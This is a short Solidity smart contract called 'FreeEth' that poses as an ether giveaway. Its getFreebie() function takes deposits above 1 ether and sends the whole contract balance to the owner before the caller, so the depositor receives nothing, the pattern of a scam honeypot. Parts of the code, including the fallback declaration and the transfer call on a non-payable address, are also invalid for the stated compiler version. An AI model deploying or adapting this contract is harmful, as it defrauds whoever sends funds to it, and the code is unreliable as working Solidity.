pragma solidity ^0.8.0;

contract FreeEth {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function() external payable {}

    function getFreebie() external payable {
        if (msg.value > 1 ether) {
            address payable sender = payable(msg.sender);
            address payable thisAddr = payable(address(this));
            owner.transfer(thisAddr.balance);
            sender.transfer(thisAddr.balance);
        }
    }

    function withdraw() external payable {
        require(msg.sender == owner, "Only contract owner can withdraw funds");
        address payable ownerAddr = payable(owner);
        ownerAddr.transfer(address(this).balance);
    }

    function command(address adr, bytes calldata data) external payable {
        require(msg.sender == owner, "Only contract owner can execute commands");
        (bool success, ) = adr.call{value: msg.value}(data);
        require(success, "Command execution failed");
    }
}